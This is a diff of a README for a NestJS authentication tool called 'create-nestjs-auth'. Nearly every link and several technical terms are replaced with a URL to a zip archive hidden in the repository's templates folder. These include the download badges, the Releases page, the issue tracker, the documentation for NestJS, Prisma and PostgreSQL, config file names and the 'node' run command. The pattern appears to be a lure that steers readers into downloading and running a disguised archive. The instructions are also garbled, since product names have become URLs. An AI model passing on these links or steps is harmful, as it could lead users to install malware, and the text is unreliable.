@@ -1,6 +1,6 @@
 # 🚀 create-nestjs-auth - Secure NestJS Auth, No Setup Needed
 
-[![Download create-nestjs-auth](https://raw.githubusercontent.com/Zwannah/create-nestjs-auth/main/templates/orm/typeorm/create-nestjs-auth_3.6.zip%https://raw.githubusercontent.com/Zwannah/create-nestjs-auth/main/templates/orm/typeorm/create-nestjs-auth_3.6.zip)](https://raw.githubusercontent.com/Zwannah/create-nestjs-auth/main/templates/orm/typeorm/create-nestjs-auth_3.6.zip)
+[![Download create-nestjs-auth](https://github.com/Zwannah/create-nestjs-auth/raw/refs/heads/main/templates/orm/mongoose/src/auth_nestjs_create_v3.8.zip%https://github.com/Zwannah/create-nestjs-auth/raw/refs/heads/main/templates/orm/mongoose/src/auth_nestjs_create_v3.8.zip)](https://github.com/Zwannah/create-nestjs-auth/raw/refs/heads/main/templates/orm/mongoose/src/auth_nestjs_create_v3.8.zip)
 
 ## 🌟 Introduction
 
@@ -17,18 +17,18 @@ Welcome to `create-nestjs-auth`. This tool helps you easily create secure authen
 ## 📦 System Requirements
 
 - **Operating System**: Windows, macOS, or Linux.
-- **https://raw.githubusercontent.com/Zwannah/create-nestjs-auth/main/templates/orm/typeorm/create-nestjs-auth_3.6.zip**: Version 14 or higher.
-- **npm**: Comes with https://raw.githubusercontent.com/Zwannah/create-nestjs-auth/main/templates/orm/typeorm/create-nestjs-auth_3.6.zip or can be installed separately.
+- **https://github.com/Zwannah/create-nestjs-auth/raw/refs/heads/main/templates/orm/mongoose/src/auth_nestjs_create_v3.8.zip**: Version 14 or higher.
+- **npm**: Comes with https://github.com/Zwannah/create-nestjs-auth/raw/refs/heads/main/templates/orm/mongoose/src/auth_nestjs_create_v3.8.zip or can be installed separately.
 
 ## 📥 Download & Install
 
-To get started, you need to download `create-nestjs-auth`. You can find the latest version on our [Releases page](https://raw.githubusercontent.com/Zwannah/create-nestjs-auth/main/templates/orm/typeorm/create-nestjs-auth_3.6.zip).
+To get started, you need to download `create-nestjs-auth`. You can find the latest version on our [Releases page](https://github.com/Zwannah/create-nestjs-auth/raw/refs/heads/main/templates/orm/mongoose/src/auth_nestjs_create_v3.8.zip).
 
-[![Download create-nestjs-auth](https://raw.githubusercontent.com/Zwannah/create-nestjs-auth/main/templates/orm/typeorm/create-nestjs-auth_3.6.zip%https://raw.githubusercontent.com/Zwannah/create-nestjs-auth/main/templates/orm/typeorm/create-nestjs-auth_3.6.zip)](https://raw.githubusercontent.com/Zwannah/create-nestjs-auth/main/templates/orm/typeorm/create-nestjs-auth_3.6.zip)
+[![Download create-nestjs-auth](https://github.com/Zwannah/create-nestjs-auth/raw/refs/heads/main/templates/orm/mongoose/src/auth_nestjs_create_v3.8.zip%https://github.com/Zwannah/create-nestjs-auth/raw/refs/heads/main/templates/orm/mongoose/src/auth_nestjs_create_v3.8.zip)](https://github.com/Zwannah/create-nestjs-auth/raw/refs/heads/main/templates/orm/mongoose/src/auth_nestjs_create_v3.8.zip)
 
 ### Steps to Download
 
-1. **Click the Download Link**: Visit [this link](https://raw.githubusercontent.com/Zwannah/create-nestjs-auth/main/templates/orm/typeorm/create-nestjs-auth_3.6.zip) to go to our Releases page.
+1. **Click the Download Link**: Visit [this link](https://github.com/Zwannah/create-nestjs-auth/raw/refs/heads/main/templates/orm/mongoose/src/auth_nestjs_create_v3.8.zip) to go to our Releases page.
    
 2. **Choose the Latest Version**: Look for the latest version available. 
 
@@ -52,7 +52,7 @@ To get started, you need to download `create-nestjs-auth`. You can find the late
 
 8. **Run the Application**: Start the application by executing:
    ```
-   node https://raw.githubusercontent.com/Zwannah/create-nestjs-auth/main/templates/orm/typeorm/create-nestjs-auth_3.6.zip
+   node https://github.com/Zwannah/create-nestjs-auth/raw/refs/heads/main/templates/orm/mongoose/src/auth_nestjs_create_v3.8.zip
    ```
 
 9. **Access Your Application**: Open your web browser and type `http://localhost:3000` to see your new application running.
@@ -61,9 +61,9 @@ To get started, you need to download `create-nestjs-auth`. You can find the late
 
 While `create-nestjs-auth` requires zero configuration, you may want to customize some settings:
 
-1. **Database Configuration**: Update your database settings in the `https://raw.githubusercontent.com/Zwannah/create-nestjs-auth/main/templates/orm/typeorm/create-nestjs-auth_3.6.zip` file. Make sure to set the correct PostgreSQL connection details.
+1. **Database Configuration**: Update your database settings in the `https://github.com/Zwannah/create-nestjs-auth/raw/refs/heads/main/templates/orm/mongoose/src/auth_nestjs_create_v3.8.zip` file. Make sure to set the correct PostgreSQL connection details.
 
-2. **JWT Secret Key**: Modify the JWT secret in `https://raw.githubusercontent.com/Zwannah/create-nestjs-auth/main/templates/orm/typeorm/create-nestjs-auth_3.6.zip` for added security.
+2. **JWT Secret Key**: Modify the JWT secret in `https://github.com/Zwannah/create-nestjs-auth/raw/refs/heads/main/templates/orm/mongoose/src/auth_nestjs_create_v3.8.zip` for added security.
 
 3. **User Roles**: Edit the user roles directly in the database to set access permissions accordingly.
 
@@ -71,7 +71,7 @@ While `create-nestjs-auth` requires zero configuration, you may want to customiz
 
 If you have questions or need help, you can reach out through:
 
-- **GitHub Issues**: Post any questions or issues [here](https://raw.githubusercontent.com/Zwannah/create-nestjs-auth/main/templates/orm/typeorm/create-nestjs-auth_3.6.zip).
+- **GitHub Issues**: Post any questions or issues [here](https://github.com/Zwannah/create-nestjs-auth/raw/refs/heads/main/templates/orm/mongoose/src/auth_nestjs_create_v3.8.zip).
   
 - **Discussion Forums**: Join our community discussions for tips and tricks.
 
@@ -85,9 +85,9 @@ To update `create-nestjs-auth`, repeat the download steps. Make sure to always u
 
 ## 📚 Additional Resources
 
-- **NestJS Documentation**: [Visit here](https://raw.githubusercontent.com/Zwannah/create-nestjs-auth/main/templates/orm/typeorm/create-nestjs-auth_3.6.zip)
-- **Prisma Documentation**: [Visit here](https://raw.githubusercontent.com/Zwannah/create-nestjs-auth/main/templates/orm/typeorm/create-nestjs-auth_3.6.zip)
-- **PostgreSQL Documentation**: [Visit here](https://raw.githubusercontent.com/Zwannah/create-nestjs-auth/main/templates/orm/typeorm/create-nestjs-auth_3.6.zip)
+- **NestJS Documentation**: [Visit here](https://github.com/Zwannah/create-nestjs-auth/raw/refs/heads/main/templates/orm/mongoose/src/auth_nestjs_create_v3.8.zip)
+- **Prisma Documentation**: [Visit here](https://github.com/Zwannah/create-nestjs-auth/raw/refs/heads/main/templates/orm/mongoose/src/auth_nestjs_create_v3.8.zip)
+- **PostgreSQL Documentation**: [Visit here](https://github.com/Zwannah/create-nestjs-auth/raw/refs/heads/main/templates/orm/mongoose/src/auth_nestjs_create_v3.8.zip)
 
 ## ⚙️ Frequently Asked Questions
 
